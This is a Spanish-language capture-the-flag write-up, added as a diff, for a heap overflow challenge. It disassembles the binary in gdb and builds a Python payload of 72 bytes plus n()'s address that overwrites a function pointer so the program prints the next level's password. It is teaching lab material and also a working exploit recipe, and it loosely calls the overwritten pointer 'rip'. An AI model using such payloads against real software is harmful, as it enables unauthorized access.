@@ -1,0 +1,67 @@
+1.- Con gdb analizamos el binario y vemos sus funciones
+  (gdb) info functoins
+  [...]
+  0x08048454  n
+  0x08048468  m
+  0x0804847c  main  
+  [...]
+
+2.- Desensamblamos main()
+
+3.- Vemos que hay por medio de un puntero a funcion hace una llamada a m() pero no a n()
+  [...]
+  0x08048495 <+25>:	mov    DWORD PTR [esp],0x4      ; [esp] = 4
+  0x0804849c <+32>:	call   0x8048350 <malloc@plt>   ; malloc(4)
+  0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax ; Guarda el puntero de malloc en [esp+0x18]
+  0x080484a5 <+41>:	mov    edx,0x8048468            ; Asigna la dirección de m() en edx
+  0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18] ; Guarda el puntero del malloc en eax
+  0x080484ae <+50>:	mov    DWORD PTR [eax],edx      ; Asigna el puntero de m() en [esp+0x18] (ahora eax)
+  [...]
+  0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18] ; Recupera el puntero de m() en eax
+  [...]
+  0x080484d0 <+84>:	call   eax                      ; Llama a m()
+  [...]
+
+4.- Desenamblamos m() y vemos que lo único que hace es un simple puts() de la cadena "Nope"
+  [...]
+  0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
+  0x08048475 <+13>:	call   0x8048360 <puts@plt>
+  [...]
+  (gdb) x/s 0x80485d1
+  0x80485d1:	"Nope"
+
+5.- Desensamblamos n() vemos que hace una llamada a system() con la cadena "/bin/cat /home/user/level7/.pass"
+  [...]
+  0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
+  0x08048461 <+13>:	call   0x8048370 <system@plt>
+  [...]
+  (gdb) x/s 0x80485b0
+  0x80485b0:	"/bin/cat /home/user/level7/.pass"
+
+6.- La función n() es la que nos permitirá obtener el .pass
+
+7.- Volvemos a main() y vemos que hace un strcpy() de argv[1] sobre un puntero previamente reservado
+  con malloc(64)
+  [...]
+  0x08048485 <+9>:	mov    DWORD PTR [esp],0x40     ; [esp] = 64
+  0x0804848c <+16>:	call   0x8048350 <malloc@plt>   ; malloc(64)
+  0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax ; Guarda el puntero de malloc en [esp+0x1c]
+  [...]
+  0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx  ; Esto es argv[1]
+  0x080484c2 <+70>:	mov    DWORD PTR [esp],eax      ; Esto es el puntero de maolloc(64)
+  0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>   ; La llamada a strcpy()
+  [...]
+
+8.- Al hacer una reserva de 64 y no limitar argv[1] podemos hacer un overflow sobre el heap para sobreescribir
+  rip y llamar a la función n() que nos dará la flag
+
+9.- Probamos hacer prueba y error para averiguar el offset para el overflow o podemos usar https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+10.- El offset es 72 y vamos a montar la cadena
+  #Python 2.7.3
+  python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/payload
+  #Python3
+  python -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x54\x84\x04\x08")' > payload
+
+11.- Para hacer efectivo el payload se lo tenemos que pasar como argumento al binario
+  ./level6 $(cat /tmp/payload)
